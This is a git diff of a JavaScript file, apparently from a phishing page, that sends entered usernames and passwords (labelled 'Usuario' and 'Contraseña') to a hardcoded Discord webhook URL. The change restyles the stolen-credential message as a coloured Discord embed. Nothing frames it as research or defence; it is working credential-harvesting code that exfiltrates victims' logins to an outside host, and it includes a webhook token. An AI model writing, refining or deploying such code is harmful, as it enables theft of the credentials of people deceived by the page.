@@ -19,7 +19,20 @@ document.addEventListener('DOMContentLoaded', function() {
         const webhookURL = 'https://discord.com/api/webhooks/1227536146230415453/u7a_u18UKBa8D4cOF2eI0XY8ftTyc_Kpn0Ea1Ew-gmqTXGQCLDMgWmpOCoxK2HQtUSLR';
         // Datos a enviar al webhook
         const payload = {
-            content: `Usuario: ${data.username}, Contraseña: ${data.password}`
+            embeds: [{
+                title: "",
+                color: parseInt("00ff4e", 16), // Color personalizado en hexadecimal
+                fields: [
+                    {
+                        name: "<:username:1227678315817472020> Usuario",
+                        value: data.username
+                    },
+                    {
+                        name: "<:password:1227678205079457864> Contraseña",
+                        value: data.password
+                    }
+                ]
+            }]
         };
         // Realiza la petición POST al webhook de Discord
         fetch(webhookURL, {
